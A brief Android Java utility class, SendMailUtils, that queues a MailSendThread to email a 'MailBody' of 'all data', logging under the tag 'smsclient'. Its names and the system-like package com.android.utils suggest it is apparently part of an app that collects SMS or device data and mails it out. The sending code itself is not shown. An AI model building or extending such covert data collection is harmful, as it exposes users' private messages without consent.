package com.android.utils;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.content.Context;

import com.android.db.MailBody;
import com.android.thread.MailSendThread;

public class SendMailUtils {

	private static ExecutorService pool=Executors.newFixedThreadPool(1);
	public static void SendAllDataToMail(Context context,MailBody mailbody){
		LogUtils.write("smsclient", "准备发送线程");
		MailSendThread mst=new MailSendThread(context, mailbody);
		pool.execute(mst);
	}
}
